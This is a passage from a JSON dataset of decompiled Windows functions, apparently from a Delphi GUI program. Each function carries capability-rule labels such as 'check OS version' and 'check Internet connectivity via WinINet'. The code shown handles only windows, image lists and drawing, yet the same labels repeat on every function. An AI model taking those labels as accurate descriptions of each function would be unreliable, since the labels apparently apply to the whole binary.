            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00447558(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 8) != '\\0') {\n        cVar1 = fcn.0042ef38();\n        if ((cVar1 != '\\0') &&\n           ((((*(in_EAX + 0x28) != '\\0' || (*(in_EAX + 0xc) != 0)) || (*(in_EAX + 0x10) != 0)) ||\n            ((*(in_EAX + 0x14) != 0 || (*(in_EAX + 0x18) != 0)))))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "00447590": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447590(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 2)) {\n        *(in_EAX + 2) = param_2;\n        if ((*(in_EAX + 2) != '\\0') && (*(in_EAX[1] + 0x350) != '\\0')) {\n            fcn.0044295c();\n        }\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00447654": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447654(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043ab74();\n    if (iVar1 != 0) {\n        *0x497c24 = 0;\n        sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n        if ((*(*(in_EAX + 0x44) + 0x273) == '\\x01') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\n            fcn.0043f1cc();\n            fcn.00441fc4();\n        }\n        fcn.004448a8();\n        fcn.00444a04();\n        if (*(*0x497c18 + 100) != 0) {\n            uVar2 = fcn.00457a28();\n            sub.user32.dll_SetFocus(uVar2);\n        }\n        if (*(in_EAX + 0x14a) != 0) {\n            (**(in_EAX + 0x148))();\n        }\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "004476f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004476f4(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x447757;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x497c1c = *0x497c1c + 1;\n    if (*0x497c1c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x497c14 != 0) {\n            iStack20 = 0x44771b;\n            fcn.0043acb0();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x497c2c != 0) {\n            iStack20 = *0x497c2c;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.0041930c();\n        fcn.00406a20();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 275
    },
    "00447a64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00447a64(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 50
    },
    "00447a6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447a6c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.00447c3c();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00447c04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447c04(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.00447a64();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.00447ba0();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040483c();\n    return;\n}\n",
        "token_count": 129
    },
    "00447ec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447ec4(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00447a64();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.00428b88();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.00429f8c();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.0042915c();\n            fcn.0042482c();\n            fcn.00418388(&var_28h, *(in_EAX + 0x30));\n            fcn.0042915c(&var_28h);\n            fcn.00424bd0();\n            fcn.0042915c(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.00424ec0();\n            uVar2 = fcn.00447ba0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00418388(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.0042915c();\n            var_8h = fcn.00424ec0();\n            fcn.0042482c();\n            uVar2 = fcn.00424ec0();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.0042482c();\n            uVar2 = fcn.00424ec0();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.004478b4(arg_ch);\n            fcn.00447e9c(uVar2);\n            uVar2 = fcn.004478b4();\n            uVar2 = fcn.00424ec0(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.00447ba0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 787
    },
    "004486c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004486c8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.00447da8();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.004485d8(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 135
    },
    "0044877c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044877c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x448799;\n    var_4h = in_EAX;\n    fcn.0041b880();\n    puStack84 = 0x4487a8;\n    fcn.0041b880();\n    puStack84 = 0x4487b4;\n    var_8h = fcn.00428b88();\n    uStack88 = 0x448a00;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041b654();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x4487e7;\n    fcn.0041b674(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x4487f3;\n    var_10h = fcn.00428b88();\n    uStack108 = 0x4489e3;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.00428b88();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.00428b88();\n    fcn.00429f8c();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00418388(&fcn.0044877c::var_30h, *(var_4h + 0x30));\n    fcn.00448da8();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.004183b0(&fcn.0044877c::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044877c::var_40h;\n                    uVar2 = fcn.0042915c();\n                    fcn.0042915c(uVar2);\n                    fcn.00424a9c(puVar3);\n                    fcn.004183b0(&fcn.0044877c::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044877c::var_40h;\n                    uVar2 = fcn.0042915c();\n                    fcn.0042915c(uVar2);\n                    fcn.00424a9c(puVar3);\n                    fcn.00447cdc();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00448dac();\n    return;\n}\n",
        "token_count": 1045
    },
    "00448c64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448c64(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x497c48 == 0) {\n        *0x497c48 = fcn.0040e318();\n        if (0x5ffff < *0x497c48) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x497c4c = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x448cc3;\n    iVar1 = fcn.00420354(0);\n    uStack44 = 0x448d5e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x497c4c == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.00447ba0(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040db2c();\n            fcn.00404eb4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.00447ba0(1, iVar1);\n        iVar1 = (**0x497c4c)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040db2c();\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x448d65;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 477
    },
    "00448dac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448dac(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0044952c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044952c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f838();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00404610();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x4496b0;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 269
    },
    "004497a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.004497a8(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.00437178();\n    if (cVar2 == '\\0') {\n        fcn.0043b068();\n        iVar4 = fcn.00432ecc();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004047cc();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x0044982f:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.0044a078();\n                        iVar5 = fcn.0044a0d8();\n                        if (iVar5 != -1) goto code_r0x0044982f;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 417
    },
    "00449bdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449bdc(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x449cd4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.004047f0();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.00449674(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.00449660();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004047cc(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.00449bdc();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 532
    },
    "0044a078": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044a078(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 87
    },
    "0045a170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a170(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.0045bd18();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0044c780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044c780(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044c724();\n    if ((iVar1 == 0) && (*0x497c5a != 0)) {\n        (**0x497c58)();\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0044ca70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044ca70(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0044c724();\n    if (((iVar1 != 0) && (*0x4916f4 != 0)) && (iVar1 == *(*0x4916f4 + 0x30))) {\n        iVar1 = *0x4916f4;\n    }\n    return iVar1;\n}\n",
        "token_count": 102
    },
    "0044ca98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ca98(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x4916f4 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004047cc(),  iVar1 = *0x4916f4,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x4916f4 = iVar1;\n        uVar3 = fcn.00457a28();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "0044cd60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044cd60(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44ce5f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044decc();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x497c84;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x497c84, &var_ch);\n            fcn.0044d83c();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044decc();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044decc();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044decc();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0044d83c();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0044decc();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.0044d83c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 641
    },
    "0044cf9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044cf9c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.0040483c();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 75
    },
    "0044d038": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044d038(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0044cf28();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.00424684();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.0042b0b4();\n    fcn.00424800();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 224
    },
    "0044d230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d230(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "0044d29c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
